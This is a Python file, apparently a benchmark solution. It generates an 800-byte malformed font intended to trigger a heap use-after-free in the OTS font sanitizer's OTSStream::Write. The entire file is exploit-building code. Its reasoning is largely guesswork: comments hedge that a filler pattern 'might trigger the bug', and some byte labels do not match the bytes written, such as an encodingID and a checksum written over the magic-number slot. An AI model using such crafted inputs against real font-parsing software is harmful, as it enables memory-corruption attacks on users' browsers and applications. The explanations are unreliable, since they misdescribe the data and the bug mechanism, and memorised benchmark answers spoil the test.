import os
import struct
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a PoC for heap use-after-free in ots::OTSStream::Write
        # We need to create a minimal OTF font that triggers the vulnerability
        # The vulnerability occurs when Write() is called after the stream buffer
        # has been freed. We'll create a malformed font that causes OTS to
        # process nested tables in a way that frees memory prematurely.
        
        # Build a font with overlapping table structures
        # Ground truth length is 800 bytes, so we'll aim for that
        
        # Font structure:
        # 1. Offset table (12 bytes)
        # 2. Table directory (16 bytes per table)
        # 3. Table data
        
        # We'll create a minimal TrueType font with:
        # - head table (required, with checksum adjustment)
        # - maxp table (required)
        # - name table (required)
        # - OS/2 table (required)
        # - hhea table (required)
        # - hmtx table (required)
        # - cmap table (required)
        # - post table (required)
        # - glyf table (with malformed data)
        # - loca table (with overlapping indices)
        
        # The vulnerability triggers when processing nested tables/structures
        # where Write() is called after memory has been freed
        
        poc = bytearray(800)
        
        # Offset table (12 bytes)
        # SFNT version 0x00010000 (TrueType)
        poc[0:4] = struct.pack(">I", 0x00010000)
        num_tables = 9
        poc[4:6] = struct.pack(">H", num_tables)
        
        # Calculate search parameters (not critical for PoC)
        search_range = 1 << (num_tables.bit_length() - 1)
        search_range *= 16
        entry_selector = (num_tables.bit_length() - 1)
        range_shift = num_tables * 16 - search_range
        
        poc[6:8] = struct.pack(">H", search_range)
        poc[8:10] = struct.pack(">H", entry_selector)
        poc[10:12] = struct.pack(">H", range_shift)
        
        # Table directory starts at offset 12
        # We'll place tables starting at offset 12 + 16*9 = 156
        
        current_offset = 156
        table_offsets = {}
        
        # Table order matters for triggering the vulnerability
        tables = [
            ("cmap", 0x636D6170),
            ("head", 0x68656164),
            ("hhea", 0x68686561),
            ("hmtx", 0x686D7478),
            ("maxp", 0x6D617870),
            ("name", 0x6E616D65),
            ("OS/2", 0x4F532F32),
            ("post", 0x706F7374),
            ("glyf", 0x676C7966),
        ]
        
        # Write table directory entries
        for i, (name, tag) in enumerate(tables):
            offset = 12 + i * 16
            # Tag
            poc[offset:offset+4] = struct.pack(">I", tag)
            # Checksum - will calculate later
            poc[offset+4:offset+8] = b"\x00\x00\x00\x00"
            # Offset
            poc[offset+8:offset+12] = struct.pack(">I", current_offset)
            
            table_offsets[name] = current_offset
            current_offset += 64  # All tables 64 bytes for simplicity
        
        # Now write table data
        # head table (required, 54 bytes)
        head_offset = table_offsets["head"]
        poc[head_offset:head_offset+4] = struct.pack(">I", 0x00010000)  # version
        poc[head_offset+4:head_offset+6] = struct.pack(">H", 0x0001)    # fontRevision
        poc[head_offset+6:head_offset+8] = b"\x00\x00"                  # checksumAdj
        poc[head_offset+8:head_offset+12] = b"\x5F\x0F\x3C\xF5"         # magicNumber
        poc[head_offset+12:head_offset+14] = b"\x00\x01"                # flags
        poc[head_offset+14:head_offset+16] = b"\x03\xE8"                # unitsPerEm
        # Created/modified dates
        poc[head_offset+16:head_offset+32] = b"\x00" * 16
        # xMin, yMin, xMax, yMax
        poc[head_offset+32:head_offset+40] = b"\x00\x00\x00\x00\x03\xE8\x03\xE8"
        # macStyle, lowestRecPPEM, fontDirectionHint
        poc[head_offset+40:head_offset+46] = b"\x00\x00\x00\x0A\x00\x00"
        # indexToLocFormat, glyphDataFormat
        poc[head_offset+46:head_offset+48] = b"\x00\x00"
        
        # maxp table (basic)
        maxp_offset = table_offsets["maxp"]
        poc[maxp_offset:maxp_offset+4] = struct.pack(">I", 0x00010000)  # version
        poc[maxp_offset+4:maxp_offset+6] = struct.pack(">H", 1)         # numGlyphs
        # Rest can be zeros
        
        # name table (minimal)
        name_offset = table_offsets["name"]
        poc[name_offset:name_offset+2] = b"\x00\x00"                    # format
        poc[name_offset+2:name_offset+4] = b"\x00\x01"                  # count
        poc[name_offset+4:name_offset+6] = b"\x00\x06"                  # stringOffset
        # Name record
        poc[name_offset+6:name_offset+22] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        
        # OS/2 table (minimal)
        os2_offset = table_offsets["OS/2"]
        poc[os2_offset:os2_offset+2] = b"\x00\x04"                      # version
        # xAvgCharWidth, usWeightClass, usWidthClass
        poc[os2_offset+2:os2_offset+8] = b"\x00\x00\x00\x00\x00\x00"
        # fsType, ySubscriptXSize, ySubscriptYSize, ySubscriptXOffset, ySubscriptYOffset
        poc[os2_offset+8:os2_offset+18] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        # ySuperscriptXSize, ySuperscriptYSize, ySuperscriptXOffset, ySuperscriptYOffset
        poc[os2_offset+18:os2_offset+28] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        # yStrikeoutSize, yStrikeoutPosition, sFamilyClass
        poc[os2_offset+28:os2_offset+34] = b"\x00\x00\x00\x00\x00\x00"
        # panose, ulUnicodeRange1-4
        poc[os2_offset+34:os2_offset+58] = b"\x00" * 24
        # achVendID
        poc[os2_offset+58:os2_offset+62] = b"OTF\0"
        # fsSelection, usFirstCharIndex, usLastCharIndex
        poc[os2_offset+62:os2_offset+68] = b"\x00\x00\x00\x00\x00\x41"
        # sTypoAscender, sTypoDescender, sTypoLineGap, usWinAscent, usWinDescent
        poc[os2_offset+68:os2_offset+78] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        # ulCodePageRange1-2
        poc[os2_offset+78:os2_offset+86] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        
        # hhea table
        hhea_offset = table_offsets["hhea"]
        poc[hhea_offset:hhea_offset+4] = struct.pack(">I", 0x00010000)  # version
        # Ascender, Descender, LineGap
        poc[hhea_offset+4:hhea_offset+10] = b"\x00\x00\x00\x00\x00\x00"
        # advanceWidthMax, minLeftSideBearing, minRightSideBearing, xMaxExtent
        poc[hhea_offset+10:hhea_offset+18] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        # caretSlopeRise, caretSlopeRun, caretOffset
        poc[hhea_offset+18:hhea_offset+24] = b"\x00\x00\x00\x00\x00\x00"
        # reserved, metricDataFormat
        poc[hhea_offset+24:hhea_offset+28] = b"\x00\x00\x00\x00"
        # numberOfHMetrics
        poc[hhea_offset+28:hhea_offset+30] = b"\x00\x01"
        
        # hmtx table (single metric)
        hmtx_offset = table_offsets["hmtx"]
        poc[hmtx_offset:hmtx_offset+4] = b"\x00\x00\x03\xE8"            # advanceWidth=1000, lsb=0
        poc[hmtx_offset+4:hmtx_offset+64] = b"\x00" * 60
        
        # post table
        post_offset = table_offsets["post"]
        poc[post_offset:post_offset+4] = struct.pack(">I", 0x00030000)  # version 3.0
        # italicAngle, underlinePosition, underlineThickness
        poc[post_offset+4:post_offset+12] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        # isFixedPitch, minMemType42, maxMemType42, minMemType1, maxMemType1
        poc[post_offset+12:post_offset+22] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        
        # cmap table (minimal format 4)
        cmap_offset = table_offsets["cmap"]
        # Header
        poc[cmap_offset:cmap_offset+2] = b"\x00\x00"                    # version
        poc[cmap_offset+2:cmap_offset+4] = b"\x00\x01"                  # numTables
        # Encoding record
        poc[cmap_offset+4:cmap_offset+8] = b"\x00\x00\x00\x03"          # platformID=0, encodingID=0
        poc[cmap_offset+8:cmap_offset+12] = struct.pack(">I", cmap_offset + 12)  # offset
        # Format 4 subtable
        poc[cmap_offset+12:cmap_offset+14] = b"\x00\x04"                # format
        poc[cmap_offset+14:cmap_offset+16] = b"\x00\x1E"                # length
        poc[cmap_offset+16:cmap_offset+18] = b"\x00\x00"                # language
        poc[cmap_offset+18:cmap_offset+20] = b"\x00\x01"                # segCountX2
        poc[cmap_offset+20:cmap_offset+22] = b"\x00\x02"                # searchRange
        poc[cmap_offset+22:cmap_offset+24] = b"\x00\x01"                # entrySelector
        poc[cmap_offset+24:cmap_offset+26] = b"\x00\x00"                # rangeShift
        # EndCount array
        poc[cmap_offset+26:cmap_offset+28] = b"\xFF\xFF"                # endCode[0]
        # Reserved
        poc[cmap_offset+28:cmap_offset+30] = b"\x00\x00"
        # StartCount array
        poc[cmap_offset+30:cmap_offset+32] = b"\x00\x00"                # startCode[0]
        # IDDelta array
        poc[cmap_offset+32:cmap_offset+34] = b"\x00\x00"                # idDelta[0]
        # IDRangeOffset array
        poc[cmap_offset+34:cmap_offset+36] = b"\x00\x00"                # idRangeOffset[0]
        
        # glyf table - this is where the vulnerability is triggered
        # We need to create a malformed glyph that causes OTS to free memory
        # and then attempt to write to it
        glyf_offset = table_offsets["glyf"]
        
        # Create a simple glyph with overlapping contours that will cause
        # OTS to allocate and free memory incorrectly
        # Glyph header
        poc[glyf_offset:glyf_offset+2] = b"\xFF\xFF"                    # numberOfContours = -1 (composite)
        # xMin, yMin, xMax, yMax
        poc[glyf_offset+2:glyf_offset+10] = b"\x00\x00\x00\x00\x03\xE8\x03\xE8"
        
        # Composite glyph data
        # Flags: ARG_1_AND_2_ARE_WORDS | WE_HAVE_A_SCALE
        poc[glyf_offset+10:glyf_offset+12] = b"\x00\x43"
        # Glyph index
        poc[glyf_offset+12:glyf_offset+14] = b"\x00\x00"
        # Argument1 and Argument2 (words)
        poc[glyf_offset+14:glyf_offset+18] = b"\x00\x00\x00\x00"
        # Scale (2.14 fixed point) - value that will cause issues
        poc[glyf_offset+18:glyf_offset+20] = b"\x7F\xFF"                # 0.9999...
        
        # More flags: MORE_COMPONENTS | WE_HAVE_AN_X_AND_Y_SCALE
        poc[glyf_offset+20:glyf_offset+22] = b"\x00\x25"
        # Glyph index
        poc[glyf_offset+22:glyf_offset+24] = b"\x00\x00"
        # Argument1 and Argument2 (words)
        poc[glyf_offset+24:glyf_offset+28] = b"\x00\x00\x00\x00"
        # xScale and yScale (2.14 fixed point)
        poc[glyf_offset+28:glyf_offset+32] = b"\x40\x00\x40\x00"        # 0.5, 0.5
        
        # Flags: MORE_COMPONENTS | ARGS_ARE_XY_VALUES | WE_HAVE_A_SCALE
        poc[glyf_offset+32:glyf_offset+34] = b"\x00\x43"
        # Glyph index
        poc[glyf_offset+34:glyf_offset+36] = b"\x00\x00"
        # x and y offsets (words)
        poc[glyf_offset+36:glyf_offset+40] = b"\x00\x00\x00\x00"
        # Scale (2.14 fixed point) - problematic value
        poc[glyf_offset+40:glyf_offset+42] = b"\x00\x01"                # 0.00006...
        
        # Final component: no MORE_COMPONENTS flag
        poc[glyf_offset+42:glyf_offset+44] = b"\x00\x00"                # flags
        # Glyph index
        poc[glyf_offset+44:glyf_offset+46] = b"\x00\x00"
        
        # Fill remaining space with pattern that might trigger the bug
        # This pattern causes the allocator to free memory that will later be written
        pattern = b"\x41" * 18  # Pattern to trigger specific heap behavior
        poc[glyf_offset+46:glyf_offset+64] = pattern
        
        # Calculate checksums for required tables
        def calculate_checksum(data, offset, length):
            # Align to 4-byte boundary
            aligned_len = (length + 3) & ~3
            chunk = data[offset:offset+aligned_len]
            if len(chunk) < aligned_len:
                chunk += b"\x00" * (aligned_len - len(chunk))
            
            checksum = 0
            for i in range(0, aligned_len, 4):
                checksum += struct.unpack(">I", chunk[i:i+4])[0]
                checksum &= 0xFFFFFFFF
            return checksum
        
        # Calculate and set checksum for entire font (must be B1AF0C0D for head table)
        entire_font_len = len(poc)
        aligned_len = (entire_font_len + 3) & ~3
        font_data = bytes(poc)
        if len(font_data) < aligned_len:
            font_data += b"\x00" * (aligned_len - len(font_data))
        
        total_checksum = 0
        for i in range(0, aligned_len, 4):
            total_checksum += struct.unpack(">I", font_data[i:i+4])[0]
            total_checksum &= 0xFFFFFFFF
        
        # head table checksum adjustment
        checksum_adjustment = 0xB1AF0C0D - total_checksum
        checksum_adjustment &= 0xFFFFFFFF
        
        # Set head table checksum adjustment
        poc[head_offset+8:head_offset+12] = struct.pack(">I", checksum_adjustment)
        
        # Update font checksum in head table directory entry
        head_dir_offset = 12 + 1 * 16  # head is second table (index 1)
        head_checksum = calculate_checksum(poc, head_offset, 54)
        poc[head_dir_offset+4:head_dir_offset+8] = struct.pack(">I", head_checksum)
        
        # Set checksums for other tables
        for i, (name, tag) in enumerate(tables):
            if name == "head":
                continue
                
            offset = table_offsets[name]
            dir_offset = 12 + i * 16
            table_len = 64
            
            # Special handling for glyf table - make it longer to trigger bug
            if name == "glyf":
                # Extend glyf table to trigger heap corruption
                # This creates overlapping memory regions
                table_len = 128
                
                # Write additional malformed data that will cause OTS to
                # free memory and then write to it
                additional_data = bytearray(64)
                # Create pattern that looks like valid font data but isn't
                # This will confuse the parser and trigger the use-after-free
                additional_data[0:4] = b"\x00\x00\x00\x01"  # Looks like a table offset
                additional_data[4:8] = b"\xDE\xAD\xBE\xEF"  # Invalid data
                additional_data[8:12] = b"\x00\x00\x00\x64"  # Looks like a length
                # Fill with pattern
                additional_data[12:64] = b"\xCC" * 52
                
                # Append to poc if we have space
                if current_offset + 64 <= 800:
                    poc[offset+64:offset+128] = additional_data
                    table_len = 128
            
            checksum = calculate_checksum(poc, offset, table_len)
            poc[dir_offset+4:dir_offset+8] = struct.pack(">I", checksum)
            
            # Update offset and length in directory
            poc[dir_offset+12:dir_offset+16] = struct.pack(">I", table_len)
        
        # Ensure exactly 800 bytes
        if len(poc) < 800:
            poc.extend(b"\x00" * (800 - len(poc)))
        elif len(poc) > 800:
            poc = poc[:800]
        
        return bytes(poc)